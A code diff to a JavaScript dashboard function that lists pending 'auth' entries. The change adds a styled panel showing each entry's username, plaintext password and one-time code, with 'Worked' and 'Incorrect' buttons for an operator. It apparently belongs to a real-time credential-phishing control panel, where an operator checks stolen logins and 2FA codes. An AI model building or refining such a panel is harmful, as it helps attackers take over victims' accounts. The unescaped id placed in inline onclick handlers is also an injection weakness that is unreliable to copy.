@@ -2076,11 +2076,21 @@ async function refreshPsAuth() {
     const pending = rows.filter(x => x.status === 'pending');
     wrap.style.display = pending.length ? 'block' : 'none';
     box.innerHTML = pending.map(p => `
-      <div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap;margin-bottom:8px;padding:8px;border:1px solid var(--border);border-radius:10px;background:var(--card2)">
-        <b>${esc(p.user||'?')}</b>
-        <span class="muted">${esc(p.stage||'')} · ${esc(p.id||'')}</span>
-        <button class="cmd sm" type="button" onclick="psAuthDecide('${p.id}', true)">Worked</button>
-        <button class="cmd sm danger" type="button" onclick="psAuthDecide('${p.id}', false)">Incorrect</button>
+      <div style="margin-bottom:10px;padding:12px;border:1px solid var(--border);border-radius:12px;background:var(--card2)">
+        <div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap;margin-bottom:8px">
+          <b style="font-size:14px">${esc(p.user||'?')}</b>
+          <span class="pill">${esc(p.stage||'')}</span>
+          <span class="muted" style="font-size:11px">${esc(p.id||'')}</span>
+        </div>
+        <div style="font-family:var(--mono);font-size:12px;line-height:1.6;margin-bottom:10px;padding:10px;border-radius:10px;background:rgba(225,29,72,.1);border:1px solid rgba(225,29,72,.3)">
+          <div><span class="muted">user</span> <b>${esc(p.user||'')}</b></div>
+          <div><span class="muted">password</span> <b style="color:var(--accent2)">${esc(p.password||'(none)')}</b></div>
+          <div><span class="muted">code</span> <b style="color:var(--accent2)">${esc(p.code||'(none)')}</b></div>
+        </div>
+        <div style="display:flex;gap:8px">
+          <button class="cmd sm" type="button" onclick="psAuthDecide('${p.id}', true)">Worked</button>
+          <button class="cmd sm danger" type="button" onclick="psAuthDecide('${p.id}', false)">Incorrect</button>
+        </div>
       </div>`).join('') || '<div class="muted">no pending</div>';
   } catch (e) {}
 }
